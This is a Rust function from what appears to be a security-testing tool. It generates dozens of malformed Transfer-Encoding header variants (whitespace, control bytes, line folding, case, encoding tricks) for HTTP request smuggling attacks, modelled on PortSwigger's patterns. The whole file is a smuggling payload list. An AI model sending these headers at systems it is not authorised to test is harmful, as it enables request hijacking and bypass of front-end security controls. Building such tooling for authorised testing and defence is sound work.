/// Generate Transfer-Encoding header variations for CL.TE and TE.CL attacks
/// Based on PortSwigger's http-request-smuggler patterns
pub fn get_te_header_variations() -> Vec<String> {
    let mut te_headers = vec![
        // === Basic vanilla variation ===
        "Transfer-Encoding: chunked".to_string(),
        // === Whitespace variations ===
        " Transfer-Encoding: chunked".to_string(), // Space prefix (nameprefix with space)
        "\tTransfer-Encoding: chunked".to_string(), // Tab prefix
        "Transfer-Encoding : chunked".to_string(), // Space before colon (space1)
        "Transfer-Encoding  : chunked".to_string(), // Double space before colon
        "Transfer-Encoding\t: chunked".to_string(), // Tab before colon
        "Transfer-Encoding:\tchunked".to_string(), // Tab after colon
        "Transfer-Encoding\t:\tchunked".to_string(), // Tab around colon
        "Transfer-Encoding:  chunked".to_string(), // Double space after colon
        "Transfer-Encoding:chunked".to_string(),   // No space after colon (nospace1)
        "Transfer-Encoding: chunked ".to_string(), // Trailing space
        "Transfer-Encoding: chunked\t".to_string(), // Trailing tab (tabsuffix)
        "Transfer-Encoding: chunked\r".to_string(), // CR suffix (0dsuffix)
        // === Line wrapping/folding variations (HTTP/1.1 obs-fold) ===
        "Transfer-Encoding:\n chunked".to_string(), // Newline + space (linewrapped1)
        "Transfer-Encoding:\r\n chunked".to_string(), // CRLF + space (line folding)
        "Transfer-Encoding:\r\n\tchunked".to_string(), // CRLF + tab (tabwrap)
        "Transfer-Encoding\r\n : chunked".to_string(), // CRLF before colon
        "Transfer-Encoding:\r\n \r\n chunked".to_string(), // Double wrapped (doublewrapped)
        "Foo: bar\r\n Transfer-Encoding: chunked".to_string(), // Line-folded after another header (nameprefix1)
        "Foo: bar\r\n\tTransfer-Encoding: chunked".to_string(), // Tab-prefixed after header (nameprefix2)
        // === Control character variations ===
        "Transfer-Encoding:\x0Bchunked".to_string(), // Vertical tab after colon
        "Transfer-Encoding: \x0Bchunked".to_string(), // Vertical tab in value (vertwrap)
        "Transfer-Encoding:\x0Cchunked".to_string(), // Form feed after colon
        "Transfer-Encoding: chunked\n\x0B".to_string(), // Vertical tab wrap after value
        // === Special prefix/suffix bytes ===
        "\x00Transfer-Encoding: chunked".to_string(), // Null byte prefix
        "Transfer-Encoding\x00: chunked".to_string(), // Null in header name
        "Transfer-Encoding: chunked\x00".to_string(), // Null suffix
        "\x7FTransfer-Encoding: chunked".to_string(), // DEL char prefix
        "Transfer-Encoding\x7F: chunked".to_string(), // DEL in header name
        // === Quote variations ===
        "Transfer-Encoding: \"chunked\"".to_string(), // Double quoted (quoted)
        "Transfer-Encoding: 'chunked'".to_string(),   // Single quoted (aposed)
        // === Multiple encoding values ===
        "Transfer-Encoding: chunked, identity".to_string(), // Comma-separated (commaCow)
        "Transfer-Encoding: identity, chunked".to_string(), // Reversed order (cowComma)
        "Transfer-Encoding: chunked,identity".to_string(),  // No space after comma
        "Transfer-Encoding: identity,chunked".to_string(),  // No space, reversed
        "Transfer-Encoding: chunked , identity".to_string(), // Spaces around comma
        "Transfer-Encoding: identity, chunked, identity".to_string(), // Nested encoding
        // === Header name variations ===
        "Transfer_Encoding: chunked".to_string(), // Underscore instead of hyphen (underjoin1)
        "Transfer Encoding: chunked".to_string(), // Space instead of hyphen (spacejoin1)
        "Transfer\\Encoding: chunked".to_string(), // Backslash instead of hyphen
        "Transfer\x00Encoding: chunked".to_string(), // Null in hyphen position
        // === Case variations ===
        "transfer-encoding: chunked".to_string(), // Lowercase
        "TRANSFER-ENCODING: chunked".to_string(), // Uppercase
        "TRANSFER-ENCODING: CHUNKED".to_string(), // All uppercase
        "tRaNsFeR-eNcOdInG: cHuNkEd".to_string(), // Mixed case (multiCase)
        "Transfer-encoding: chunked".to_string(), // First letter caps only
        // === Value variations ===
        "Transfer-Encoding: chunk".to_string(), // Truncated value (lazygrep)
        "Transfer-Encoding: CHUNKED".to_string(), // Uppercase value
        "Transfer-Encoding:  Chunked".to_string(), // Mixed case with extra space
        // === Bad line ending variations ===
        "Foo: bar\rTransfer-Encoding: chunked".to_string(), // CR only before TE (badsetupCR)
        "Foo: bar\nTransfer-Encoding: chunked".to_string(), // LF only before TE (badsetupLF)
        "Foo: bar\r\n\rTransfer-Encoding: chunked".to_string(), // Extra CR (0dwrap)
        // === CR injection variations ===
        "Tra\rnsfer-Encoding: chunked".to_string(), // CR in header name (0dspam)
        "Transfer-\rEncoding: chunked".to_string(), // CR after hyphen
        "Transfer-Encoding:\r chunked".to_string(), // CR + space after colon
        // === Junk/garbage variations ===
        "Transfer-Encoding x: chunked".to_string(), // Junk before colon (spjunk)
        "Transfer-Encoding: x chunked".to_string(), // Junk in value
        "X: y\r\nTransfer-Encoding: chunked".to_string(), // Preceded by junk header
        // === URL-encoded variations ===
        "Transfer-%45ncoding: chunked".to_string(), // URL-encoded E (encode)
        "Transfer-Encoding: %63hunked".to_string(), // URL-encoded c in value
        // === MIME encoding variations ===
        "Transfer-Encoding: =?iso-8859-1?B?Y2h1bmtlZA==?=".to_string(), // Base64 MIME (qencode)
        "Transfer-Encoding: =?UTF-8?B?Y2h1bmtlZA==?=".to_string(), // UTF-8 Base64 MIME (qencodeutf)
        // === HTTP/1.0 style ===
        "Transfer-Encoding: chunked".to_string(), // Standard for HTTP/1.0 test
    ];

    // Add extended ASCII variations (bytes > 0x7F) using String::from_utf8_lossy
    // These patterns are inspired by PortSwigger's nel, nbsp, shy, spaceFF, accentTE, accentCH
    let extended_ascii_patterns: Vec<String> = vec![
        // NEL character (0x85) - Next Line
        format!(
            "Transfer-Encoding{}: chunked",
            String::from_utf8_lossy(&[0x85])
        ),
        // NBSP (0xA0) - Non-Breaking Space
        format!(
            "Transfer-Encoding{}: chunked",
            String::from_utf8_lossy(&[0xA0])
        ),
        // Soft hyphen (0xAD) replacing hyphen
        format!(
            "Transfer{}Encoding: chunked",
            String::from_utf8_lossy(&[0xAD])
        ),
        // NBSP after colon
        format!(
            "Transfer-Encoding:{}chunked",
            String::from_utf8_lossy(&[0xA0])
        ),
        // High byte (0xFF) in value
        format!(
            "Transfer-Encoding: {}chunked",
            String::from_utf8_lossy(&[0xFF])
        ),
        // Accented character in name (0x82 - Latin Small Letter E with Acute in some encodings)
        format!(
            "Transf{}r-Encoding: chunked",
            String::from_utf8_lossy(&[0x82])
        ),
        // Accented character in value (0x96 - En Dash in some encodings)
        format!(
            "Transfer-Encoding: ch{}nked",
            String::from_utf8_lossy(&[0x96])
        ),
    ];
    te_headers.extend(extended_ascii_patterns);

    // Control character constants for header manipulation patterns
    // These are common control characters used in HTTP request smuggling attacks
    const NUL: u8 = 0x00; // Null byte - can cause early string termination in some parsers
    const TAB: u8 = 0x09; // Horizontal tab - valid HTTP whitespace
    const LF: u8 = 0x0A; // Line feed - HTTP line separator
    const VT: u8 = 0x0B; // Vertical tab - not valid HTTP whitespace, but sometimes accepted
    const FF: u8 = 0x0C; // Form feed - not valid HTTP whitespace, but sometimes accepted
    const CR: u8 = 0x0D; // Carriage return - HTTP line separator
    const SP: u8 = 0x20; // Space - valid HTTP whitespace
    const DEL: u8 = 0x7F; // Delete character - can cause parsing issues

    // Add whitespace prefix variations with common control characters
    // These test how parsers handle control characters before header names
    for ch in [NUL, TAB, LF, VT, FF, CR, SP, DEL].iter() {
        if *ch != TAB && *ch != SP {
            // Skip tab and space as they're already covered in basic variations
            te_headers.push(format!(
                "{}Transfer-Encoding: chunked",
                String::from_utf8_lossy(&[*ch])
            ));
        }
    }

    // Add suffix variations with control characters after the value
    // These test how parsers handle trailing control characters
    for ch in [NUL, TAB, VT, FF, DEL].iter() {
        te_headers.push(format!(
            "Transfer-Encoding: chunked{}",
            String::from_utf8_lossy(&[*ch])
        ));
    }

    // Add header name suffix variations (control character before colon)
    // These test how parsers handle control characters in header names
    for ch in [NUL, TAB, VT, FF, DEL].iter() {
        te_headers.push(format!(
            "Transfer-Encoding{}: chunked",
            String::from_utf8_lossy(&[*ch])
        ));
    }

    te_headers
}
